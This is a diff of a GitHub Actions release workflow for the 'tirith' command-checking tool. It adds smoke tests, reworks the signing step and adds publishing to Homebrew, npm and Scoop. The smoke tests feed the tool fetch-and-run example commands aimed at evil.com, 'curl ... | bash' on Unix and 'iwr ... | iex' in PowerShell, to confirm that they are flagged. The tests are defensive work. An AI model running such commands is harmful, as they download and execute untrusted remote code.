@@ -3,6 +3,12 @@ name: Release
 on:
   push:
     tags: ["v*"]
+  workflow_dispatch:
+    inputs:
+      dry_run:
+        description: "Build and smoke-test only (no publish)"
+        type: boolean
+        default: true
 
 permissions:
   contents: write
@@ -10,17 +16,17 @@ permissions:
 
 jobs:
   build:
-    name: Build (${{ matrix.name }})
+    name: Build (${{ matrix.target }})
     runs-on: ${{ matrix.os }}
     strategy:
       fail-fast: false
       matrix:
         include:
-          - { os: macos-latest, target: aarch64-apple-darwin, name: "macOS-arm64" }
-          - { os: macos-latest, target: x86_64-apple-darwin, name: "macOS-x86_64" }
-          - { os: ubuntu-latest, target: x86_64-unknown-linux-gnu, name: "Linux-x86_64" }
-          - { os: ubuntu-latest, target: aarch64-unknown-linux-gnu, name: "Linux-aarch64" }
-          - { os: windows-latest, target: x86_64-pc-windows-msvc, name: "Windows-x86_64" }
+          - { os: macos-latest, target: aarch64-apple-darwin }
+          - { os: macos-latest, target: x86_64-apple-darwin }
+          - { os: ubuntu-latest, target: x86_64-unknown-linux-gnu }
+          - { os: ubuntu-latest, target: aarch64-unknown-linux-gnu }
+          - { os: windows-latest, target: x86_64-pc-windows-msvc }
     steps:
       - uses: actions/checkout@v4
 
@@ -41,44 +47,90 @@ jobs:
       - name: Generate completions and man page (Unix)
         if: runner.os != 'Windows'
         run: |
-          mkdir -p dist/completions dist/man
-          ./target/${{ matrix.target }}/release/tirith completions bash > dist/completions/tirith.bash
-          ./target/${{ matrix.target }}/release/tirith completions zsh > dist/completions/_tirith
-          ./target/${{ matrix.target }}/release/tirith completions fish > dist/completions/tirith.fish
-          ./target/${{ matrix.target }}/release/tirith manpage > dist/man/tirith.1
+          mkdir -p staging/completions staging/man
+          ./target/${{ matrix.target }}/release/tirith completions bash > staging/completions/tirith.bash
+          ./target/${{ matrix.target }}/release/tirith completions zsh > staging/completions/_tirith
+          ./target/${{ matrix.target }}/release/tirith completions fish > staging/completions/tirith.fish
+          ./target/${{ matrix.target }}/release/tirith manpage > staging/man/tirith.1
+          cp target/${{ matrix.target }}/release/tirith staging/
 
-      - name: Generate completions (Windows)
+      - name: Generate completions and man page (Windows)
         if: runner.os == 'Windows'
+        shell: pwsh
         run: |
-          mkdir dist\completions
-          .\target\${{ matrix.target }}\release\tirith.exe completions powershell > dist\completions\tirith.ps1
+          New-Item -ItemType Directory -Force -Path staging\completions, staging\man
+          .\target\${{ matrix.target }}\release\tirith.exe completions bash > staging\completions\tirith.bash
+          .\target\${{ matrix.target }}\release\tirith.exe completions zsh > staging\completions\_tirith
+          .\target\${{ matrix.target }}\release\tirith.exe completions fish > staging\completions\tirith.fish
+          .\target\${{ matrix.target }}\release\tirith.exe manpage > staging\man\tirith.1
+          Copy-Item target\${{ matrix.target }}\release\tirith.exe staging\
 
       - name: Package (Unix)
         if: runner.os != 'Windows'
         run: |
-          mkdir -p dist/shell/lib
-          cp target/${{ matrix.target }}/release/tirith dist/
-          cp shell/tirith.sh dist/shell/
-          cp shell/lib/* dist/shell/lib/
-          cd dist && tar czf ../tirith-${{ matrix.name }}.tar.gz .
+          cd staging
+          tar czf ../tirith-${{ matrix.target }}.tar.gz tirith completions man
 
       - name: Package (Windows)
         if: runner.os == 'Windows'
+        shell: pwsh
         run: |
-          mkdir dist\shell\lib
-          copy target\${{ matrix.target }}\release\tirith.exe dist\
-          copy shell\lib\powershell-hook.ps1 dist\shell\lib\
-          cd dist && Compress-Archive -Path * -DestinationPath ..\tirith-${{ matrix.name }}.zip
+          cd staging
+          Compress-Archive -Path tirith.exe, completions, man -DestinationPath ..\tirith-${{ matrix.target }}.zip
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: tirith-${{ matrix.name }}
-          path: tirith-${{ matrix.name }}.*
+          name: tirith-${{ matrix.target }}
+          path: tirith-${{ matrix.target }}.*
+
+  smoke-test:
+    name: Smoke Test (${{ matrix.target }})
+    needs: build
+    runs-on: ${{ matrix.os }}
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          - { os: macos-latest, target: aarch64-apple-darwin }
+          - { os: ubuntu-latest, target: x86_64-unknown-linux-gnu }
+          - { os: windows-latest, target: x86_64-pc-windows-msvc }
+    steps:
+      - name: Download artifact
+        uses: actions/download-artifact@v4
+        with:
+          name: tirith-${{ matrix.target }}
+
+      - name: Extract and test (Unix)
+        if: runner.os != 'Windows'
+        run: |
+          tmpdir=$(mktemp -d)
+          tar xzf tirith-${{ matrix.target }}.tar.gz -C "$tmpdir"
+          chmod +x "$tmpdir/tirith"
+          "$tmpdir/tirith" --version
+          "$tmpdir/tirith" doctor
+          "$tmpdir/tirith" check -- "curl https://evil.com | bash" && exit 1 || true
+          "$tmpdir/tirith" check -- "ls -la"
+          rm -rf "$tmpdir"
+
+      - name: Extract and test (Windows)
+        if: runner.os == 'Windows'
+        shell: pwsh
+        run: |
+          $tmpdir = New-Item -ItemType Directory -Path "$env:TEMP\tirith-smoke" -Force
+          Expand-Archive -Path tirith-${{ matrix.target }}.zip -DestinationPath $tmpdir -Force
+          & "$tmpdir\tirith.exe" --version
+          & "$tmpdir\tirith.exe" doctor
+          & "$tmpdir\tirith.exe" check --shell powershell -- "iwr https://evil.com | iex"
+          if ($LASTEXITCODE -eq 0) { exit 1 }
+          & "$tmpdir\tirith.exe" check -- "dir"
+          if ($LASTEXITCODE -ne 0) { exit 1 }
+          Remove-Item -Recurse -Force $tmpdir
 
   release:
     name: Create Release
-    needs: build
+    needs: smoke-test
+    if: startsWith(github.ref, 'refs/tags/v')
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
@@ -92,16 +144,22 @@ jobs:
       - name: Generate checksums
         run: |
           cd artifacts
-          sha256sum tirith-* > SHA256SUMS.txt
-          cat SHA256SUMS.txt
+          sha256sum tirith-* > checksums.txt
+          cat checksums.txt
 
-      - name: Sign with cosign
+      - name: Install cosign
         uses: sigstore/cosign-installer@v3
 
       - name: Sign checksums
         run: |
           cd artifacts
-          cosign sign-blob --yes SHA256SUMS.txt --bundle SHA256SUMS.txt.bundle
+          cosign sign-blob --yes \
+            --output-signature checksums.txt.sig \
+            --output-certificate checksums.txt.pem \
+            checksums.txt
+
+      - name: Copy install script
+        run: cp scripts/install.sh artifacts/install.sh
 
       - name: Create GitHub Release
         uses: softprops/action-gh-release@v2
@@ -110,9 +168,10 @@ jobs:
           files: |
             artifacts/*
 
-  publish:
+  publish-crates:
     name: Publish to crates.io
     needs: release
+    if: startsWith(github.ref, 'refs/tags/v')
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
@@ -130,3 +189,193 @@ jobs:
         run: cargo publish -p tirith --locked
         env:
           CARGO_REGISTRY_TOKEN: ${{ secrets.CARGO_REGISTRY_TOKEN }}
+
+  publish-homebrew:
+    name: Update Homebrew Tap
+    needs: release
+    if: startsWith(github.ref, 'refs/tags/v')
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          path: source
+
+      - name: Download all artifacts
+        uses: actions/download-artifact@v4
+        with:
+          path: artifacts
+          merge-multiple: true
+
+      - name: Checkout tap repo
+        uses: actions/checkout@v4
+        with:
+          repository: sheeki03/homebrew-tap
+          token: ${{ secrets.TAP_GITHUB_TOKEN }}
+          path: homebrew-tap
+
+      - name: Update formula
+        env:
+          VERSION: ${{ github.ref_name }}
+        run: |
+          VER="${VERSION#v}"
+          mkdir -p homebrew-tap/Formula
+          cp source/packaging/homebrew/tirith.rb homebrew-tap/Formula/tirith.rb
+          cd artifacts
+          SHA_AA=$(sha256sum tirith-aarch64-apple-darwin.tar.gz | cut -d' ' -f1)
+          SHA_XA=$(sha256sum tirith-x86_64-apple-darwin.tar.gz | cut -d' ' -f1)
+          SHA_AL=$(sha256sum tirith-aarch64-unknown-linux-gnu.tar.gz | cut -d' ' -f1)
+          SHA_XL=$(sha256sum tirith-x86_64-unknown-linux-gnu.tar.gz | cut -d' ' -f1)
+          cd ..
+          sed -i "s/version \"0.1.0\"/version \"${VER}\"/" homebrew-tap/Formula/tirith.rb
+          sed -i "s|releases/download/v0.1.0/|releases/download/${VERSION}/|g" homebrew-tap/Formula/tirith.rb
+          sed -i "0,/sha256 \"PLACEHOLDER\"/{s/sha256 \"PLACEHOLDER\"/sha256 \"${SHA_AA}\"/}" homebrew-tap/Formula/tirith.rb
+          sed -i "0,/sha256 \"PLACEHOLDER\"/{s/sha256 \"PLACEHOLDER\"/sha256 \"${SHA_XA}\"/}" homebrew-tap/Formula/tirith.rb
+          sed -i "0,/sha256 \"PLACEHOLDER\"/{s/sha256 \"PLACEHOLDER\"/sha256 \"${SHA_AL}\"/}" homebrew-tap/Formula/tirith.rb
+          sed -i "0,/sha256 \"PLACEHOLDER\"/{s/sha256 \"PLACEHOLDER\"/sha256 \"${SHA_XL}\"/}" homebrew-tap/Formula/tirith.rb
+
+      - name: Push formula
+        run: |
+          cd homebrew-tap
+          git config user.name "github-actions[bot]"
+          git config user.email "github-actions[bot]@users.noreply.github.com"
+          git add Formula/tirith.rb
+          git commit -m "tirith ${{ github.ref_name }}"
+          git push
+
+  publish-npm:
+    name: Publish npm Packages
+    needs: release
+    if: startsWith(github.ref, 'refs/tags/v')
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 20
+          registry-url: https://registry.npmjs.org
+
+      - name: Download all artifacts
+        uses: actions/download-artifact@v4
+        with:
+          path: artifacts
+          merge-multiple: true
+
+      - name: Prepare platform packages
+        run: |
+          set -euo pipefail
+
+          VERSION="${GITHUB_REF_NAME#v}"
+
+          # Map: npm-dir archive-name binary-name
+          declare -A NPM_MAP=(
+            ["darwin-arm64"]="tirith-aarch64-apple-darwin.tar.gz:tirith"
+            ["darwin-x64"]="tirith-x86_64-apple-darwin.tar.gz:tirith"
+            ["linux-x64"]="tirith-x86_64-unknown-linux-gnu.tar.gz:tirith"
+            ["linux-arm64"]="tirith-aarch64-unknown-linux-gnu.tar.gz:tirith"
+            ["win32-x64"]="tirith-x86_64-pc-windows-msvc.zip:tirith.exe"
+          )
+
+          for platform in "${!NPM_MAP[@]}"; do
+            IFS=':' read -r archive binary <<< "${NPM_MAP[$platform]}"
+            pkg_dir="npm/${platform}"
+
+            # Extract binary into package bin/
+            tmpdir=$(mktemp -d)
+            if [[ "$archive" == *.zip ]]; then
+              unzip -o "artifacts/${archive}" -d "$tmpdir"
+            else
+              tar xzf "artifacts/${archive}" -C "$tmpdir"
+            fi
+
+            mkdir -p "${pkg_dir}/bin"
+            cp "${tmpdir}/${binary}" "${pkg_dir}/bin/${binary}"
+            chmod +x "${pkg_dir}/bin/${binary}" 2>/dev/null || true
+            rm -rf "$tmpdir"
+
+            # Update version in package.json
+            cd "$pkg_dir"
+            node -e "
+              const pkg = require('./package.json');
+              pkg.version = '${VERSION}';
+              require('fs').writeFileSync('package.json', JSON.stringify(pkg, null, 2) + '\n');
+            "
+            cd -
+          done
+
+          # Update root package version
+          cd npm/tirith
+          node -e "
+            const pkg = require('./package.json');
+            pkg.version = '${VERSION}';
+            for (const dep of Object.keys(pkg.optionalDependencies || {})) {
+              pkg.optionalDependencies[dep] = '${VERSION}';
+            }
+            require('fs').writeFileSync('package.json', JSON.stringify(pkg, null, 2) + '\n');
+          "
+          cd -
+
+          # Ensure launcher has correct permissions and line endings
+          chmod +x npm/tirith/bin/tirith
+
+      - name: Publish platform packages
+        env:
+          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
+        run: |
+          for dir in npm/darwin-arm64 npm/darwin-x64 npm/linux-x64 npm/linux-arm64 npm/win32-x64; do
+            echo "Publishing $(basename $dir)..."
+            cd "$dir"
+            npm publish --access public
+            cd -
+          done
+
+      - name: Publish root package
+        env:
+          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
+        run: |
+          cd npm/tirith
+          npm publish --access public
+
+  publish-scoop:
+    name: Update Scoop Bucket
+    needs: release
+    if: startsWith(github.ref, 'refs/tags/v')
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          path: source
+
+      - name: Download all artifacts
+        uses: actions/download-artifact@v4
+        with:
+          path: artifacts
+          merge-multiple: true
+
+      - name: Checkout scoop bucket
+        uses: actions/checkout@v4
+        with:
+          repository: sheeki03/scoop-tirith
+          token: ${{ secrets.TAP_GITHUB_TOKEN }}
+          path: scoop-tirith
+
+      - name: Update manifest
+        env:
+          VERSION: ${{ github.ref_name }}
+        run: |
+          VER="${VERSION#v}"
+          HASH=$(sha256sum artifacts/tirith-x86_64-pc-windows-msvc.zip | cut -d' ' -f1)
+          mkdir -p scoop-tirith/bucket
+          cp source/packaging/scoop/tirith.json scoop-tirith/bucket/tirith.json
+          sed -i "s/\"version\": \"0.1.0\"/\"version\": \"${VER}\"/" scoop-tirith/bucket/tirith.json
+          sed -i "s|releases/download/v0.1.0/|releases/download/${VERSION}/|" scoop-tirith/bucket/tirith.json
+          sed -i "s/\"hash\": \"PLACEHOLDER\"/\"hash\": \"${HASH}\"/" scoop-tirith/bucket/tirith.json
+
+      - name: Push manifest
+        run: |
+          cd scoop-tirith
+          git config user.name "github-actions[bot]"
+          git config user.email "github-actions[bot]@users.noreply.github.com"
+          git add bucket/tirith.json
+          git commit -m "tirith ${{ github.ref_name }}"
+          git push
